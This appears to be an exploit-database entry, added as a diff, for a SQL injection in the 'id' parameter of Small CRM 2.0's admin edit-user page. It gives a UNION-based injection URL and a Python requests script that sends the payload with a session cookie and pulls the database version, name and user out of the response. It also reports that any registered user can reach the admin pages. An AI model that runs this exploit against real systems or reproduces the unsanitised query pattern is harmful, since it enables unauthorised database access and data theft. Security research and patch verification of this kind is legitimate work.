@@ -1,0 +1,63 @@
+id: 34676
+date: 07/13/2020
+title: Small CRM 2.0 SQL Injection Exploit
+author: gh1mau
+cves: 
+
+# Exploit Title: Small CRM in PHP - 'id' SQL Injection
+# Exploit Author: gh1mau
+# Team Members: Capt'N,muzzo,chaos689 | https://h0fclanmalaysia.wordpress.com/
+# Vendor Homepage: https://phpgurukul.com/small-crm-php/
+# Software Link: https://phpgurukul.com/?smd_process_download=1&download_id=10412
+# Version: V2.0
+# Tested on: PHP 5.6.18, Apache/2.4.18 (Win32), Ver 14.14 Distrib 5.7.11, for Win32 (AMD64)
+
+Info:
+-----
+[+] Any registered user can access admin pages - no proper ACL / session control
+
+Vulnerable File:
+---------------- 
+/admin/edit-user.php 
+
+Vulnerable Code:
+-----------------
+line 13:  $userid=$_GET['id'];
+
+Vulnerable Issue:
+-----------------
+$userid=$_GET['id']; has no sanitization
+
+POC:
+----
+
+[+] Need any registered user to be authenticated first.
+
+http://localhost/crm/admin/edit-user.php?id=3'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT_WS(0x3a,version(),database(),user()),NULL,NULL--+-
+
+Python Code:
+------------
+
+import requests,re
+
+url = "http://localhost:80/crm/admin/edit-user.php?id=3%27+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('gh1mau',version(),0x3a,database(),0x3a,user(),'gh1mau'),NULL,NULL--+-"
+
+payload = ""
+headers = {
+    "Cookie": "PHPSESSID=3a3vmbd86fo50kl6qjd2t6ug76", 
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", 
+    "Connection": "close", 
+    "Host": "localhost", 
+    "Accept-Encoding": "gzip, deflate", 
+    "Upgrade-Insecure-Requests": "1", 
+    "Accept-Language": "en-US,en;q=0.5"
+}
+
+pattern = "(?<=gh1mau).*?(?=gh1mau)"
+response = requests.request("GET", url, data=payload, headers=headers)
+version=re.findall(pattern,response.text)
+
+print(version)
+
+#  0day.today [2023-03-25]  #
